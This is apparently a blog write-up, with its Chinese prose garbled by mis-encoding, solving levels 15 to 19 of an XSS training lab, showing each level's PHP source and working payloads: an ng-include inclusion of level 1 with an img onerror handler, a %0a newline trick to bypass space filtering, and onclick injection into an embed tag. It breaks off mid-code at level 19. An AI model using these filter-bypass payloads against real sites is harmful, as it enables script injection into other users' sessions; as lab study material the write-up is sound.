<p>å’Œaiæ¢è®¨äº†ä¸€ä¸‹ï¼Œåœ¨æ¯”èµ›ä¸­ä¸€èˆ¬æ˜¯æœ‰botæ¥å½“åšç”¨æˆ·æ¥è®¿é—®è§¦å‘æˆ‘çš„xssï¼Œè€Œæˆ‘æ˜¯ä¸èƒ½ä¿®æ”¹ä»–ä»¬çš„hostçš„  </p>
<p>æ‰€ä»¥å¦ä¸€ä¸ªæ–¹å‘æ˜¯ä¸Šä¼ ä¸€å¼ ä¼šè¿”å›xssçš„å›¾ç‰‡ï¼Ÿ  </p>
<p>é—®é¢˜æ˜¯åœ¨æˆ‘çš„ç¯å¢ƒä¸Šæ— æ³•æ‰“å¼€ç½‘ç«™ï¼Œæç¤ºï¼š  </p>
<p>Please turn off your ad blocker.</p>
<p>è¦æˆ‘å…³æ‰æˆ‘çš„å¹¿å‘Šæ‹¦æˆªå™¨ï¼Ÿ  </p>
<p>å…³äº†edgeçš„ä¸€ä¸ªç›¸å…³åŠŸèƒ½ï¼Œè¿˜æ˜¯æ‰“ä¸å¼€ã€‚  </p>
<p>ä¸Šç½‘æ‰¾wpå§ã€‚å‚è€ƒ<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/282983.html">æ–‡ç« </a>  </p>
<p>ç½‘ç«™ä¼šè§£æå›¾ç‰‡çš„exifä¿¡æ¯ï¼Œç„¶åè¿”å›åˆ°å‰ç«¯ï¼Œåœ¨å›¾ç‰‡çš„exifé‡Œæ’å…¥xsså³å¯å®Œæˆæ”»å‡»  </p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>æŸ¥çœ‹æºç ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;script src=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level15&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°ç¬¬<span class="hljs-number">15</span>å…³ï¼Œè‡ªå·±æƒ³ä¸ªåŠæ³•èµ°å‡ºå»å§ï¼&lt;/h1&gt;<br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>åªå‘ç°å¯srcä¸€ä¸ªä¼ å…¥ç‚¹ï¼Œç»™aiçœ‹äº†ä¸€ä¸‹ï¼Œå¥½åƒè¦æœ‰ä¸­é—´ä»¶ç»•è¿‡ï¼Ÿ  </p>
<p>ä¸Šç½‘çœ‹wpï¼š  </p>
<p>ng-includeæŒ‡ä»¤å°±æ˜¯æ–‡ä»¶åŒ…æ¶µçš„æ„æ€ï¼Œç”¨æ¥åŒ…æ¶µå¤–éƒ¨çš„htmlæ–‡ä»¶ï¼Œå¦‚æœåŒ…æ¶µçš„å†…å®¹æ˜¯åœ°å€ï¼Œéœ€è¦åŠ å¼•å·  </p>
<p>ç«Ÿç„¶èƒ½ç›´æ¥åŒ…å«ç¬¬ä¸€å…³ï¼Ÿ  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">æ‰€ä»¥å¯ä»¥éšä¾¿åŒ…æ¶µä¹‹å‰çš„ä¸€å…³å¹¶å¯¹å…¶ä¼ å‚ï¼Œä»¥è¾¾åˆ°å¼¹çª—çš„æ•ˆæœï¼Œå…ˆæµ‹è¯•ä¸€ä¸‹è¿‡æ»¤äº†å•¥ï¼Œæ„é€ payload<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥å°±æ˜¯æ”»å‡»åŒ…å«çš„ä»£ç æ¥è¾¾åˆ°æ”»å‡»çš„æ•ˆæœå—ï¼Ÿ  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;fff&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>é€šå…³<br>æºwpæ˜¯ä¸‹é¢çš„payloadï¼š  </p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;</span><br><span class="language-xml">```  </span><br><span class="language-xml"></span><br><span class="language-xml">## level 16  </span><br><span class="language-xml"></span><br><span class="language-xml">ä¾æ—§å·çœ‹æºç ï¼š  </span><br><span class="language-xml">```php</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span></span><br><span class="language-javascript"><span class="language-xml">&#123;     </span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level16<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level16<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);</span><br><span class="language-php"><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);</span><br><span class="language-php"><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);</span><br><span class="language-php"><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);</span><br><span class="language-php"><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;	&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level16.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>è¿™éƒ½è¿‡æ»¤äº†å•¥ï¼Ÿ  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">script</span><br>ç©ºæ ¼<br>/  (å¯ä»¥ç”¨æ¥ä»£æ›¿ç©ºæ ¼)<br></code></pre></td></tr></table></figure>

<p>phpçš„ç©ºæ ¼ç»•è¿‡æ˜¯ç»å…¸å¿…è€ƒäº†ï¼Œä¸Šç½‘ä¸€æŸ¥å°±æœ‰ï¼Œ<br>payloadï¼š  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>asrc<span class="hljs-operator">=</span><span class="hljs-string">&quot;fff&quot;</span>%<span class="hljs-number">0</span>aonerror<span class="hljs-operator">=</span>alert()&gt;<br></code></pre></td></tr></table></figure>

<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>å¼€é¢˜å°±æ˜¾ç¤ºæ’ä»¶ä¸æ”¯æŒã€‚ã€‚ã€‚ã€‚<br>å‰ç«¯htmlï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>); </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level17<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æˆåŠŸåï¼Œ<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿˜æ˜¯çœ‹çœ‹æºç å§ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>); <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level17&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level17&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;h2 align=center&gt;æˆåŠŸåï¼Œ&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³&lt;/a&gt;&lt;/h2&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>ä¾æ—§çœ‹(wp)[<a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]">https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]</a>  </p>
<p>å¤§æ¦‚æ˜¯è€ƒäº†embadåŒºåŸŸ?   </p>
<p>é€‰æ‹©äº†æ”¹ä¸€ä¸‹æºç ã€‚ã€‚ã€‚<br>å˜æˆäº†ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=indce.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>å°è¯•äº†ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=onclick&amp;arg02=alert(1)<br></code></pre></td></tr></table></figure>
<p>ä¸è¡Œï¼Œæ³¨æ„åˆ°å†™æ³•é‡Œçš„å¼•å·<br>ç„¶è€Œæ­£ç¡®çš„payloadä¸ºï¼š  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure>
<p>å°‘äº†ä¸ªç©ºæ ¼ä¹Ÿä¸è¡Œ  </p>
<p>å½“ä¸ºarg01æ—¶ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>= <span class="hljs-string">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æˆåŠŸåï¼Œ<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>å½“ä¸º ?arg01&#x3D;onclick&amp;arg02&#x3D;alert(1) æ—¶ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?onclick</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æˆåŠŸåï¼Œ<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¯´åªæœ‰å½“ ?arg02&#x3D; onclick&#x3D;alert() æ‰èƒ½æ„æˆï¼š   </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span>= <span class="hljs-string">onclick</span>=<span class="hljs-string">alert()</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æˆåŠŸåï¼Œ<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>è¿™æ—¶çš„ onclick&#x3D;alert() æ‰æ˜¯ç”Ÿæ•ˆçš„  </p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>ä¹Ÿæ˜¯å’Œä¸Šé¢˜ä¸€æ ·æ”¹äº†ä¸€ä¸‹æºç ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level19.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level18&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level18&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=index.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>æ²¡çœ‹å‡ºæ¥æœ‰å•¥åŒºåˆ«ï¼ŒåŒä¸€ä¸ªpayloadè¿‡äº†ï¼š  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure>

<h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level20.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level19&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level19&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span 